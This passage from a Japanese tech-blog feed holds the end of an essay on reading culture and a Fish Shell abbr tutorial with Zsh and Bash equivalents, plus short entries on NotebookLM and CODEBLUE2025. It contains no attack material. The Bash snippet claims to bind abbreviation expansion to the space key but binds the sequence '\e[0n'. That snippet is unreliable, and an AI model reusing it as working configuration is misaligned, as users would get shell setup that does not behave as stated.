んでほしい」という言葉の裏には、「本を読まないあなたは、何かを失っている」という暗黙のメッセージがあります。そして、そのメッセージを受け取った側は、「本を読まなきゃダメなんだ」と感じるか、「所詮マウンティングだ」と反発します。どちらにせよ、分断が生まれます。ここで、恐ろしい矛盾に気づきます。読書によって自分のアイデンティティを保とうとすればするほど、そのアイデンティティは脆くなります。なぜなら、「読書する私」というアイデンティティは、「読書しない他者」の存在によって初めて成り立つからです。他者との差異によって、自分の価値が定義されます。だから、心のどこかで、私は「みんなが本を読む」ことを望んでいません。口では「もっと本を読んで」と言いながら、本音では、他者が本を読まないことを願っています。これは、恐ろしい自己矛盾です。実際、この矛盾は現実のものになりつつあります。「読書」という言葉が氾濫し、「読書している私」という特別さが希薄化していきます。だから、人々はより高い壁を作ろうとします。「全部読む」「原書で読む」「年間100冊読む」。新たな境界線を引きます。でも、それは本質的な解決にはなりません。どんな境界線を引いても、それは結局、他者との差異に依存しています。そして、他者との差異に依存している限り、アイデンティティは脆いのです。本棚で他者と差をつけようとすればするほど、私の本棚からは問いが減っていきます。残るのは「どう見られたいか」という問いだけです。「生き残る」という言葉の暴力性ここで、もう一度、根本的な問いに戻りましょう。「本を読まない人は生き残れない」。この言葉を目にするたびに、私は違和感を覚えます。「生き残る」という言葉は、暴力的です。「生き残る」という言葉を使うとき、私たちは何を前提としているのでしょうか。生き残る人がいます。そして、生き残れない人がいます。「生き残れなかった」人とは、誰のことを指すのでしょうか。過労死した人。病で倒れた人。若くして亡くなった才能ある人々。彼らは、「本を読まなかったから」生き残れなかったのでしょうか。違います。「生き残る/生き残れない」という二分法そのものが、暴力的です。この二分法は、人生を競争に還元しています。しかし人生は競争ではありません。人生は、複雑で、出鱈目で、混沌としていて、多面的なものです。そして、死は、敗北ではありません。同じように、「本を読め」という命令も、暴力的です。「本を読まないあなたは、遅れている」「生き残れない」。このメッセージは、受け手を追い詰めます。しかし、本を読むことは、1つの選択肢に過ぎません。価値ある選択肢ですが、唯一の選択肢ではありません。本を読まなくても、学べることはあります。成長できることはあります。だから、言葉を言い換える必要があります。「生き残る」ではなく、「価値を示し続ける」。「本を読め」ではなく、「本を読む」。この言い換えは、単なる言葉遊びではありません。根本的な視点の転換です。「生き残る」は、生と死の二分法です。ゼロサム・ゲームです。誰かが生き残るためには、誰かが生き残れません。でも、「価値を示す」は、程度の問題です。グラデーションです。みんなが価値を示せます。同じように、「本を読め」は、命令です。義務です。他律です。でも、「本を読む」は、選択です。欲求です。自律です。そして、この転換こそが、読書を解放する鍵です。重要なのは、生き残るために本を読むことではなく、「どう生きたいのか」という問いに少しずつ形を与えていくことです。ここで、改めて考えてみます。成長とは何でしょうか。加速文化の中では、成長は「より多く」「より速く」「より効率的に」として定義されます。より多くの本を読みます。より速く読みます。より効率的に知識を得ます。しかし、それは本当に成長なのでしょうか。成長とは、自分が変わることです。好みが変わります。価値観が変わります。問いが変わります。見える世界が変わります。そして、その変容こそが、「変化する環境の中で価値を示し続ける」ための基盤になります。なぜなら、自分が変われる人は、環境の変化に適応できるからです。自分が変われない人は、環境が変化したとき、取り残されます。「より多く」「より速く」「より効率的に」知識を得ることは、自分を変えません。むしろ、既存の自分を強化します。既存の自分を肥大化させます。そして、環境が変化したとき、その肥大化した自分が、足かせになります。もう1つ、考えてみます。価値とは何でしょうか。これは、一言でいえるような簡単なものではありません。しかし少なくとも、そのガイドラインになるものは、自分軸で持っておいたほうがいいでしょう。この「自分軸」こそが、読書によって獲得すべきものです。自分軸とは、問いです。「何が面白いのか」「何が重要なのか」「何のために働くのか」「何のために生きるのか」。これらの問いに対する自分なりの答え、あるいは答えを探し続ける姿勢。それこそが「自分軸」であり、「やりたいこと」であり、AIに代替されない価値の源泉です。しかし「必読書リスト」は、その問いを奪います。加速を拒否しますここまで、加速文化と読書の問題を語ってきました。では、どうすればいいのでしょうか。加速を拒否します。立ち止まります。これは、単なる怠惰ではありません。積極的な抵抗です。読書を取り戻すために、3つの根本的な問いと向き合う必要があります。これらの問いは、読書という行為の本質に関わるものです。答えを急ぐ必要はありません。問い続けることそのものが、読書を解放する鍵になります。第一の問い：誰のために読むのでしょうか「本を読まなきゃ」と思うとき、私たちは誰の声を聞いているのでしょうか。SNSのタイムラインに流れてくる「読書のすすめ」。「必読書リスト」。「新人が読むべき本」。これは全て、他者の期待です。他者が定めた基準です。でも、その本は、本当に自分が読みたい本なのでしょうか。現代の自己啓発は、「自分らしさを見つけろ」「本当の自分を知れ」と言います。でも、これは罠です。「自分らしさ」を追求することが、かえって自分を見失わせます。なぜなら、「自分らしさ」とは、他者との差異によって定義されるからです。「他の人とは違う、特別な私」。でも、その「特別さ」は、脆いのです。常に他者との比較によってしか成り立ちません。向き合うべきは、自分が関わる人々に対する義務です。家族に対する義務。友人に対する義務。社会に対する義務。そして、読書についても同じです。古典を読む義務。先人たちが残した思想と格闘する義務。この「義務」は、他者から課されるものではありません。自分が自分に課すものです。同時に、断る勇気も必要です。「必読書リスト」を無視していいのです。途中で「この本は自分に合わない」と思ったら、読むのをやめていいのです。誰のために読むのか。この問いに向き合うことは、他者の期待ではなく、自分が向き合いたい問いは何かという方向へ進むことです。読書を義務から解放し、選択として取り戻すことです。第二の問い：何を求めているのでしょうか「この本を読めば成長できる」「年間100冊読めば人生が変わる」「要約を見れば効率的に知識が得られる」。読書は、常に何かの「手段」として語られます。成長のため。キャリアアップのため。生き残るため。でも、本当にそれを求めているのでしょうか。ポジティブ思考が溢れています。「できる」「やればできる」「可能性は無限」。でも、これは現実を単純化します。人生は、複雑で出鱈目で混沌としていて多面的なものです。すべてをコントロールできるわけではありません。失敗もします。うまくいかないこともあります。理不尽なこともあります。読書も同じです。「この本を読めば成長できる」というポジティブな約束に騙されません。むしろ、ネガティブな可能性を受け入れます。「この本は理解できないだろう」「この本を読んでも何も変わらないだろう」「途中で飽きて読み終えられないだろう」。その上で、それでも読みます。不確実性を受け入れながら、それでも本を開きます。そして、感情とも距離を置きます。「読まなきゃ」という焦燥。これらの感情は、読書を苦痛にします。今日は読む気分じゃありません。それなら、読みません。それでいいのです。より、「もっと速く」という呪縛からも自由になります。ゆっくり読んでいいです。同じページを何度も読み返していいです。一冊の本に一年かけてもいいです。速さではなく、深さ。何を求めているのか。この問いに向き合うことは、成果主義・完璧主義から解放されることです。答えを求めるのではなく、問いを見つけます。この本からどんな問いを持ち帰りたいのか。読書を手段から目的へと転換することです。第三の問い：どう読むのでしょうか自己啓発書を読みます。ビジネス書を読みます。要約動画を見ます。こうしたものは、すべて単純化します。「こうすれば成功する」「これをやれば幸せになれる」「この思考法を使えば問題が解決する」。人生を、因果関係の単純な連鎖に還元します。でも、人生は、そんなに単純なものでしょうか。小説を読めば、もっと複雑な世界観が提示されます。登場人物たちは、矛盾しています。善人でも悪人でもありません。理性的でもなければ、ただ感情的なだけでもありません。予測不可能な行動をします。そして、物語には、明確な答えがありません。むしろ、問いが生まれます。「この登場人物の選択は正しかったのか」「自分だったらどうしただろう」「人間とは何なのか」。小説を読めば、破天荒なキャラクターたちの人生を追体験することで、人生をコントロールできないことが学べます。加速文化は、「人生をコントロールできる」という幻想を植え付けます。でも、これは幻想です。人生は、コントロールできません。予測できません。理不尽です。そして、その理不尽さを受け入れることこそが、真の成熟です。小説は、その成熟を促します。同時に、未来だけでなく、過去とも対話します。現代社会は、常に「未来志向」を要求します。「過去にこだわるな」「前を向け」。でも、過去にこだわります。過去に読んだ本を、もう一度読みます。若い頃に読んで理解できなかった本を、今読み直します。そこに、新しい発見があります。昔は好きだった本を、今読み返します。自分がどう変わったかがわかります。過去の自分が選んだ本を尊重します。「あの頃の自分は何を考えていたのか」。その問いが、自分を理解する手がかりになります。過去の自分が選んだ本を「恥ずかしい」と思いません。それもまた、自分の一部です。同じ本を読み返したとき、昔の自分と今の自分で、立ち上がる問いが変わっているか。それが、自分が変わったかどうかの指標になります。どう読むのか。この問いに向き合うことは、単純化から複雑性へ、未来志向から過去との対話へと視点を転換することです。自己啓発書ばかりではなく小説を。新しい本ばかりではなく過去に読んだ本も。それは、読書を知識の獲得から思考の深化へと変えることです。本を読んだあと、問いが増えていないなら、それは「読んだ」とは言えないでしょう。読書の多様性を認めますここで、1つの矛盾に気づくでしょう。「小説を読め」と言いながら、「正しさを押し付けるな」とも言っています。これは矛盾ではないのでしょうか。いや、違います。重要なのは、「正しさ」を一つに固定しないことです。全部読む人もいれば、要約で済ませる人もいます。じっくり読む人もいれば、流し読みする人もいます。ビジネス書を読む人もいれば、小説を読む人もいます。マンガを読む人もいれば、読まない人もいます。そして、どれも「正しい」のです。私が提案しているのは、「小説を読め」ではなく、「自己啓発書『ばかり』を読むな」です。ビジネス書ばかり。要約ばかり。リストばかり。そうやって、1つの形式に固定されることが危険です。だから、多様性を持ちます。複数の形式で読みます。複数の視点を持ちます。読書に「正しさ」を求める必要はありません。「こうあるべき」という規範を押し付ける必要もありません。それぞれの読み方を、それぞれの価値として認めます。本を読むことは、「深い洞察を得る」ためだけではありません。「面白い話をする」ためでもあります。社交のツールとしての読書。これも、1つの正しい読み方です。本の内容を、自分なりに加工して、他者に提供します。それは、相手を見下すためではなく、一緒に楽しむためです。読書から特権性を剥ぎ取ったとき、読書は軽やかになります。堅苦しさがなくなります。誰にでも開かれたものになります。読書の新しい意味読書から「特権性」を剥ぎ取り、「加速」を拒否したとき、何が残るでしょうか。それは、ただ楽しいから読む、という当たり前のことです。本を読みたいから、読みます。面白いから、読みます。その時間が好きだから、読みます。他者との差異を作るためでもなく、自分のアイデンティティを保つためでもなく、「成長しなきゃ」という焦燥からでもなく。そして、「問いを得るため」でもなく、「学びを得るため」でもなく、「効率的に知識を吸収するため」でもありません。ただ読みたいから読みます。これが、本来の読書の形です。「速読」も「効率的な読書術」も「アウトプット前提のインプット」も、全部いりません。ゆっくり読んでもいいです。飛ばし読みしてもいいです。同じページを何度も読み返してもいいです。途中で飽きたら、やめてもいいです。最後まで読まなくてもいいです。読み終わったあと、何もアウトプットしなくてもいいです。SNSに投稿しなくてもいいです。読書記録をつけなくてもいいです。ただ、その時間が楽しかったなら、それで十分です。積読の山を見て、焦る必要はありません。全部読もうとしなくていいのです。今読みたい一冊を、読みます。それだけでいいのです。「もっと読まなきゃ」「遅れている」「追いつかなきゃ」。そんな焦りは、読書を義務にします。楽しむべき読書が、苦痛になります。一冊ずつ読めばいいのです。今読みたい本を、今読みます。それで十分です。そして、読み終えたら、次の一冊。その繰り返しが、気づけば大きな蓄積になります。読書は、競争ではありません。誰かより多く読む必要はありません。誰かより速く読む必要もありません。自分のペースで、自分の読みたい本を、一冊ずつ読みます。それが、読書の本来の形です。読書は、頭の中の掃除です。頭の中を整理します。雑多な思考を整えます。新しい視点を取り入れます。古い固定観念を捨てます。でも、掃除と同じように、読書も「完璧」を求める必要はありません。毎日少しずつでいいのです。一日一ページでもいいのです。完璧に読まなくてもいいのです。流し読みでもいいのです。途中で飽きたら、別の本に移ってもいいのです。読書を、義務にしません。プレッシャーにしません。自分を追い込みません。ただ、自分を大切にする1つの手段として、読書があります。それだけでいいのです。本を読んだら、感想を書かなきゃ。書評を書かなきゃ。SNSに投稿しなきゃ。そんな義務感が、読書を窮屈にします。でも、言語化しなくてもいいのです。ただ読みます。心の中に留めます。それだけでいいのです。本を読んで、何も言葉になりません。でも、何かが変わった気がします。それで十分です。言語化できない読書の体験。それこそが、最も豊かな読書なのでしょう。おわりにこの文章を書き終えて、スマホを見ます。何も変わっていません。タイムラインには相変わらず「読書のすすめ」が流れています。「本を読まない人は生き残れない」というツイートがバズっています。誰かが「必読書リスト」を作っています。たぶん、これからも変わりません。「読書は成長のため」という物語は、これからも繰り返されます。「ビジネスパーソンは本を読め」というメッセージは、これからも発信されます。それは、悪意じゃありません。本当に、善意なんです。だから、厄介なんです。でも、私は諦めません。本を読むのは、楽しいからです。物語に没入するのが、楽しいからです。知らない世界を覗き見するのが、楽しいからです。それだけです。映画を見るのと同じです。音楽を聴くのと同じです。ゲームをプレイするのと同じです。ただ、楽しいから。それ以上でも、それ以下でもありません。私は、誰も説得しようとは思いません。ただ、もしあなたも「ただ楽しいから読む」では、ダメなのかな、と思っているなら。「成長」とか「学び」とか、そういう目的がないと、読書しちゃいけないのかな、と思っているなら。伝えたいんです。大丈夫です。ただ楽しいから読む、それでいいんです。物語に夢中になって、現実を忘れる。それでいいんです。何も学ばなくていいんです。何も成長しなくていいんです。ただ、楽しければいいんです。読書は、競争じゃありません。義務でもありません。成長の手段でもありません。ただ、楽しいから読む。それだけです。ただ、楽しんでください。そして、もし誰かに「何のために読むの？」と聞かれたら、こう答えてください。「楽しいから」。それだけで、十分です。本棚を見ます。また明日、読みます。何を読むかは、まだ決めていません。でも、楽しみです。どんな物語に出会えるか。どんな世界を覗けるか。それが、楽しみです。スマホを置きます。窓を開けます。外を見ます。明日も、本を読もう。ただ、楽しいから。それだけです。参考図書加速する社会 近代における時間構造の変容作者:ハルトムート ローザ福村出版Amazon地に足をつけて生きろ！ 加速文化の重圧に対抗する7つの方法作者:スヴェン・ブリンクマンEvolvingAmazon世界のエリートが学んでいる 教養書必読１００冊を１冊にまとめてみた作者:永井孝尚KADOKAWAAmazon世界のエリートが学んでいるＭＢＡマーケティング必読書５０冊を１冊にまとめてみた作者:永井孝尚KADOKAWAAmazonさみしい夜のページをめくれ作者:古賀史健ポプラ社Amazon本を読む人はうまくいく作者:長倉 顕太すばる舎Amazon強いビジネスパーソンを目指して鬱になった僕の 弱さ考作者:井上 慎平ダイヤモンド社Amazon読んでいない本について堂々と語る方法 (ちくま学芸文庫)作者:ピエール・バイヤール,大浦康介筑摩書房Amazonビジネス書ベストセラーを１００冊読んで分かった成功の黄金律作者:堀元見徳間書店Amazon自己啓発の教科書　禁欲主義からアドラー、引き寄せの法則まで作者:アナ・カタリーナ・シャフナー日経ナショナル ジオグラフィックAmazon中年の本棚作者:荻原魚雷紀伊國屋書店Amazon","isoDate":"2025-11-23T19:33:14.000Z","dateMiliSeconds":1763926394000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"学術的根拠から読み解くNotebookLMの音声活用法","link":"https://speakerdeck.com/shukob/xue-shu-de-gen-ju-karadu-mijie-kunotebooklmnoyin-sheng-huo-yong-fa","contentSnippet":"2025年11月22日(土)に開催された「Google Developer Group - DevFest Tokyo 2025」の懇親会LTで発表させていただきました。\\rhttps://gdg-tokyo.connpass.com/event/369416/\\r\\rNotebookLMで音声解説(Podcast)機能がありますが、初学者と上級者でドキュメントでの学習とどのように使い分けたら学習効率がいいかなどを、実験結果と複数の学術的根拠を元に解説しました。","isoDate":"2025-11-22T05:00:00.000Z","dateMiliSeconds":1763787600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Fish Shell の abbr で使う。キミが好きだよ、エイリアス","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/22/123028","contentSnippet":"はじめにターミナルで作業をしていると、同じコマンドを何度も入力することがありますよね。git checkout -b feature/new-branch や kubectl get pods --all-namespaces のような長いコマンドを毎回タイプするのは面倒です。多くのシェルでは「エイリアス」を使ってこの問題を解決しますが、Fish Shell にはとても優れた機能があります。それが abbreviation（略して abbr） です。生成AIやエージェントがコマンドライン操作を支援するようになった今、履歴(history)の可読性はこれまで以上に重要です。この記事では、なぜエイリアスと別れたのか、そして abbr が現代のターミナルワークに必須のツールである理由を詳しく解説します。fishshell.comabbr とはabbr は、入力した短い文字列を長いコマンドに展開する機能です。たとえば gco と入力してスペースやエンターを押すと、自動的に git checkout に展開されます。最大の特徴は、展開がリアルタイムで可視化されることです。エイリアスと違い、実際に実行されるコマンドを目で確認してから実行できます。abbr の圧倒的なアドバンテージこれが最も重要なポイントです。2024年以降、共同作業や自動化ツールに加え、生成AIがターミナルワークを下支えするようになりました。そして、abbr はこの新しいワークスタイルに完璧にフィットします。履歴から作業内容が誰にでも伝わる例えば、昨日の作業をチームに共有するときです。エイリアスの場合:$ history | tail -20gco feature-branchgaagcm \\"Add new feature\\"gp origin feature-branch履歴を受け取った人には何が起こったか全く分かりません。gco や gaa が何を意味するのかも相手には伝わりません。個人のローカル設定は共有されていないからです。abbr の場合:$ history | tail -20git checkout feature-branchgit add --allgit commit -m \\"Add new feature\\"git push origin feature-branch誰が見ても即座に理解できます。ブランチを切り替え、全ての変更をステージングし、コミットしてプッシュしたのだとすぐ分かります。実際の活用例例1: デバッグ支援# あなたのコマンド履歴（abbr を使用）$ kubectl get pods --namespace production$ kubectl logs pod-abc123 --namespace production$ kubectl describe pod pod-abc123 --namespace production$ kubectl get events --namespace production --sort-by=\'.lastTimestamp\'# 共有したい質問: \\"このエラーの原因を知りたい\\"履歴を見た人はコンテキスト全体を理解して、適切な解決策を提示できます。エイリアス（例：k、kgp、kl）だと、何が起きているか推測すらできません。例2: ワークフローの自動化# 毎日のデプロイ作業（abbr で記録された履歴）$ docker compose build$ docker compose down$ docker compose up -d$ docker compose logs --tail=100 web$ curl https://example.com/health# 「この手順をスクリプト化して」と頼むだけ誰でも履歴を見て、ほぼそのまま自動化スクリプトを組み立てられます。例3: チームメンバーへの説明# Slack や Issue に貼り付けるだけで伝わる昨日のデプロイ手順:$ git pull origin main$ npm install$ npm run build$ docker compose build$ docker compose up -dエイリアスだと毎回「それは何のコマンドか」と説明が必要になりますが、abbr なら誰でも理解できます。コマンド履歴が機械可読になる現代の開発環境では、GitHub Copilot CLI、Claude Code、Cursor、Aider、Warp、Fig といった生成AIベースの支援ツールがあなたのコマンド履歴を解析します。これらのツールは、実際のコマンド履歴を分析して次に実行するべきコマンドを提案します。またエラーの原因を特定して修正方法を示し、作業パターンを学習して効率化を促し、プロジェクトのワークフロー理解にもつながります。エイリアスを使っていると、こうしたAIや人が作業内容を理解するのは困難です。abbr を使えば、履歴に記録されるのは実際のコマンドなので、コンテキストを正確に共有できます。チーム開発での透明性リモートペアプログラミングやスクリーンシェアで作業を共有する際です。# あなた: この手順でデプロイします$ dk build$ dk up -d$ dk logs -fチームメイト: 「...何をしているのか分かりません」abbr なら次のようになります。$ docker compose build$ docker compose up -d$ docker compose logs -fチームメイト: 「完璧に理解しました」ドキュメントとしての履歴あなたのコマンド履歴は、最高のドキュメントになります。例えば、kubectl でのデプロイ作業を考えてみましょう。エイリアスの場合、履歴には k apply -f deployment.yaml、k get pods、k logs -f pod-name のように記録され、意味が分かりません。abbr の場合は kubectl apply -f deployment.yaml、kubectl get pods、kubectl logs -f pod-name と記録されます。これなら、Wiki にコピペできますし、Issue にそのまま貼れます。解析ツールに渡して内容を振り返ってもらうこともでき、新しいチームメンバーの教材にもなります。エイリアスの時代は終わったはっきり言います。エイリアスは過去の遺物です。エイリアスが作られた時代には、コマンド履歴を第三者が読むこともあまり想定されていませんでした。スクリーンシェアで作業を共有する機会も多くありませんでした。しかし、2024年以降の開発環境は根本的に変わりました。コマンド履歴を解析する生成AIやエージェントが普及し、チームメンバーがリアルタイムであなたの画面を見ながら作業することも珍しくありません。履歴が検索可能なナレッジベースとして扱われるのが普通になりつつあります。この新しい現実において、abbr は必須です。エイリアスを使い続けることは、こうしたメリットを自ら放棄しているのと同じです。エイリアスとの決定的な違いエイリアス（Alias）の場合alias gco=\\"git checkout\\"コマンド履歴には gco と記録される実際に何が実行されたか後から分からない他人と共有する際に説明が必要abbr の場合abbr --add gco \\"git checkout\\"スペースキーを押すと git checkout が即座に展開されるコマンド履歴には展開後の git checkout が記録される履歴を検索する際に、エイリアスの短縮形ではなく実際のコマンドで検索できるスクリーンショットやドキュメントにそのままコピペできるabbr を使うべき理由abbr の主なメリットは、コマンド履歴が検索しやすくなること、他者とコマンドを共有しやすくなること、そして実際に何が実行されるかが常に可視化されることです。展開されたコマンドを毎回見るため、オプションを自然に覚えられる学習効果があります。history コマンドで過去のコマンドを見たとき、実際に何をしたかが一目瞭然です。同僚に「このコマンドを実行して」と伝える際、abbr で展開されたコマンドをそのまま共有できます。展開後に追加の引数を加えたり、一部を修正したりするのも簡単です。そして、abbr はインタラクティブシェルでのみ展開され、スクリプト内では展開されません。基本的な使い方abbr を追加するabbr --add gst \\"git status\\"abbr --add gaa \\"git add --all\\"abbr --add gcm \\"git commit -m\\"または、短縮形で表現できます。abbr -a gst \\"git status\\"abbr -a gaa \\"git add --all\\"abbr -a gcm \\"git commit -m\\"登録されている abbr を確認するabbr --list# またはabbr -labbr を削除するabbr --erase gst# またはabbr -e gstすべての abbr を表示するabbr --show# またはabbr -s実践的な abbr 設定例私の実際の config.fish から、カテゴリ別に便利な abbr を紹介します。ナビゲーション系# ディレクトリ移動を快適にabbr --add --global -- - \'cd -\'           # 直前のディレクトリに戻るabbr --add --global .. \'cd ..\'            # 一つ上の階層へabbr --add --global ... \'cd ../..\'        # 二つ上の階層へabbr --add --global .... \'cd ../../..\'    # 三つ上の階層へGit 系（最も使用頻度が高い）abbr --add --global g gitabbr --add --global ga \'git add\'abbr --add --global gaa \'git add --all\'abbr --add --global gc \'git commit -v\'abbr --add --global gcm \'git commit -m\'abbr --add --global gco \'git checkout\'abbr --add --global gcb \'git checkout -b\'abbr --add --global gp \'git push\'abbr --add --global gpl \'git pull\'abbr --add --global gst \'git status\'abbr --add --global gd \'git diff\'abbr --add --global gl \'git log\'abbr --add --global gf \'git commit --amend --no-edit\'  # 直前のコミットを修正Docker 系abbr --add --global d dockerabbr --add --global dc \'docker compose\'abbr --add --global dcu \'docker compose up\'abbr --add --global dcd \'docker compose down\'abbr --add --global dps \'docker ps\'Kubernetes 系abbr --add --global k kubectlabbr --add --global kgp \'kubectl get pods\'abbr --add --global kgs \'kubectl get svc\'abbr --add --global kgd \'kubectl get deploy\'エディタ系abbr --add --global v nvimabbr --add --global vim nvim高度な abbr の使い方1. --global オプションabbr --add --global gst \\"git status\\"--global スコープで定義すると、universal スコープ（デフォルト）よりもわずかに高速です。config.fish で定義する場合は --global を使用するのがベストプラクティスです。2. --position anywhere - どこでも展開デフォルトでは、abbr はコマンドの位置（行頭）でのみ展開されますが、--position anywhere を使うとパイプの後などでも展開できます。abbr -a L --position anywhere --set-cursor \\"% | less\\"3. --set-cursor - カーソル位置の指定展開後のカーソル位置を指定できます。% がカーソル位置のマーカーです。abbr --add grepf --set-cursor \'grep -r \\"%\\" . | fzf\'grepf とタイプしてスペースを押すと grep -r \\"\\" . | fzf に展開され、カーソルが \\"\\" の中に配置されます。4. --regex - 正規表現によるマッチングパターンを正規表現で指定できます。たとえば、.txt で終わるファイル名を vim で開けます。function vim_edit    echo vim $argvendabbr -a vim_edit_texts --position command --regex \\".+\\\\.txt\\" --function vim_edit5. --function - 関数による動的展開関数を使って動的にコマンドを生成できます。bash の !! に相当する機能です。function last_history_item    echo $history[1]endabbr -a !! --position anywhere --function last_history_item6. --command - 特定コマンドでのみ展開（Fish 4.0+）Fish 4.0 以降では、特定のコマンドに対してのみ展開される abbreviation を作成できます。abbr --add --command git co checkoutこの場合、git co は git checkout に展開されますが、co 単独では展開されません。config.fish への設定方法abbr は一度設定すれば記憶されますが、dotfiles として管理する場合は config.fish に記述する必要があります。推奨される設定方法if status is-interactive    # 既存の abbr をクリーンアップ（エラーを無視）    abbr --erase gst 2>/dev/null    abbr --erase gaa 2>/dev/null        # 新しく abbr を追加    abbr --add --global gst \'git status\'    abbr --add --global gaa \'git add --all\'    # ... 他の abbrendif status is-interactive で囲むことで、インタラクティブシェルでのみ abbr が定義されます。--erase してから --add する理由config.fish は新しいシェルを起動するたびに実行されます。既存の abbr を消してから追加することで、変更が確実に反映されます。私の設定では、すべての abbr をまとめて消去してから再定義しています。if status is-interactive    # 既存のabbreviationをクリーンアップ（エラーを無視）    abbr --erase -- - 2>/dev/null    abbr --erase .. 2>/dev/null    abbr --erase ... 2>/dev/null    # ... すべての abbr を列挙        # ナビゲーション    abbr --add --global -- - \'cd -\'    abbr --add --global .. \'cd ..\'    # ... 新しく定義endよくある質問abbr とエイリアスはどちらを使うべきかA: abbr を使ってください。議論の余地はありません。エイリアスは裏で展開されるため、実際に何が実行されているかが分かりにくくなります。特に生成AIや外部の支援ツールやチームメンバーと履歴を共有するのが当たり前になった今では、abbr は必須です。ただし、複雑な処理（条件分岐やパイプの組み合わせなど）が必要な場合は、関数を使いましょう。abbr はスクリプトで使えるかA: いいえ。abbr はインタラクティブシェルでのみ展開され、スクリプト内では展開されません。スクリプトでは関数やエイリアスを使ってください。スペースキーを押さずに abbr を展開したくない場合A: Ctrl+Space を押すと、abbr を展開せずにスペースを入力できます。abbr を一時的に無効にしたいときA: abbr は一度定義されると永続化されるので、完全に削除するか、新しいセッションでは config.fish の該当行をコメントアウトしてください。Fish 以外のシェルでも abbr を使う方法「Fish に興味はあるけど、Zsh や Bash から移行するのは大変...」と感じる人も多いでしょう。朗報です。abbr の恩恵は他のシェルでも受けられます。Zsh で abbr を使うZsh には zsh-abbr という優れたプラグインがあります。Fish の abbr に完全にインスパイアされており、ほぼ同じ機能を提供します。他にも追加でいくつか類似ソフトウェアがあるので自分にあうものを選んでほしいです。インストール方法Homebrew を使う場合:brew install olets/tap/zsh-abbr手動インストールの場合:git clone https://github.com/olets/zsh-abbr.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-abbr.zshrc に次の設定を追加します。# プラグインとして読み込むplugins=(... zsh-abbr)使い方# abbr を追加abbr gco=\\"git checkout\\"abbr gst=\\"git status\\"# グローバル abbr（コマンド位置以外でも展開）abbr -g L=\\"| less\\"# 一覧表示abbr list# 削除abbr erase gcoFish とほぼ同じシンタックスで使えます。github.com手動で実装する方法（軽量版）プラグインを使いたくない場合は、以下のコードを .zshrc に追加するだけで基本的な abbr 機能が使えます。# 展開可能なエイリアスのリストtypeset -a ealiasesealiases=()# abbr 風のエイリアス作成関数function abbrev-alias() {    alias $1    ealiases+=(${1%%\\\\=*})}# スペースキーでエイリアスを展開function expand-ealias() {    if [[ $LBUFFER =~ \\"\\\\<(${(j:|:)ealiases})\\\\$\\" ]]; then        zle _expand_alias        zle expand-word    fi    zle magic-space}zle -N expand-ealias# スペースキーをバインドbindkey \' \' expand-ealiasbindkey \'^ \' magic-space  # Ctrl+Space で展開をスキップ# Enter キーでも展開expand-alias-and-accept-line() {    expand-ealias    zle .backward-delete-char    zle .accept-line}zle -N accept-line expand-alias-and-accept-line# abbr を定義abbrev-alias gco=\\"git checkout\\"abbrev-alias gst=\\"git status\\"abbrev-alias gcm=\\"git commit -m\\"dev.toBash で abbr 風の機能を実装するBash には組み込みの abbr 機能はありませんが、bind コマンドを使って似たような動作を実現できます。# スペースキーで展開される「abbr」を実装bind \'\\"\\\\e[0n\\": \\" \\"\'# abbr のような関数function abbr-expand() {    local cmd=\\"${READLINE_LINE%% *}\\"    case \\"$cmd\\" in        gco) READLINE_LINE=\\"git checkout${READLINE_LINE#gco}\\" ;;        gst) READLINE_LINE=\\"git status${READLINE_LINE#gst}\\" ;;        gcm) READLINE_LINE=\\"git commit -m${READLINE_LINE#gcm}\\" ;;    esac}# Space キーにバインドbind -x \'\\"\\\\e[0n\\": abbr-expand\'ただし、Bash での実装は Zsh や Fish ほど洗練されていないため、本格的に abbr を使いたい場合は Zsh + zsh-abbr または Fish への移行 をお勧めします。どのシェルを選ぶべきかabbr を最大限活用したいなら、Fish がネイティブサポートで最高の体験を提供します。Zsh + zsh-abbr は Fish とほぼ同等で、POSIX 互換性も維持できます。Bash は限定的なサポートなので、他の選択肢がない場合のみお勧めします。特に、共同作業や自動化が標準になった今では、abbr のようなトランスペアレントな機能が必須です。どのシェルを使うにしても、エイリアスから abbr への移行を強くお勧めします。よくある質問（追加）今使っている Zsh から Fish に移行すべきかA: abbr だけが目的なら、zsh-abbr プラグインで十分です。ただし、Fish は他にも多くの優れた機能（シンタックスハイライト、自動補完など）を持っているので、試してみる価値はあります。既存のエイリアスを abbr に移行するのは大変かA: 非常に簡単です。alias を abbr に置き換えるだけです。Fish の場合は abbr --add、Zsh の zsh-abbr の場合も abbr コマンドがそのまま使えます。まとめFish Shell の abbr は、単なるショートカット以上の価値があります。変化の激しい開発環境において、abbr は必須のツールです。abbr が提供する価値abbr は誰にとっても読みやすい履歴を残し、あとから状況を把握する人があなたの作業を完璧に理解できるようにします。実際のコマンドが常に見えることで可視性が確保され、コマンドを自然に覚えられる学習効果があります。チームメンバーとのコミュニケーションが円滑になり、意味のある機械可読な履歴が残ります。生成AIエージェントに渡したときにも正確なコンテキストが伝わり、展開後の編集も柔軟で、コマンド履歴がそのまま最高のドキュメントになります。エイリアスから abbr への移行今すぐ始めるべき理由は明確です。Claude Code、Codex、Copilot CLI、Cursor などの支援ツールがあなたの作業を理解できるようになります。チーム開発の透明性が高まり、リモートワークやペアプログラミングでの生産性も劇的に向上します。加えて、コマンド履歴が検索可能で再利用できるナレッジとして蓄積されます。移行は非常に簡単です。Fish を使っているなら abbr --add で定義するだけ。Zsh なら zsh-abbr プラグインをインストールするだけです。エイリアスの時代はおそらく終わる気がしています。それでもエイリアスのおかげで多くの時間を節約できたのは事実ですし、長く愛用してきた相棒でもあります。ありがとう、エイリアス。参考リンクgithub.comgithub.comdev.toddbeck.comwww.youtube.com","isoDate":"2025-11-22T03:30:28.000Z","dateMiliSeconds":1763782228000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"CODEBLUE2025参加したらキラキラで眩しかった","link":"https://www.rowicy.com/blog/codeblue2025-summary-repo/","contentSnippet":"CODEBLUE2025の参加レポ(全体)","isoDate":"2025-11-22T00:00:00.000Z","dateMiliSeconds":1763769600000,"authorName":"riiim","authorId":"riiim"},{"title":"2025-11-21 社内エンジニア勉強会 改めて理解するVPC 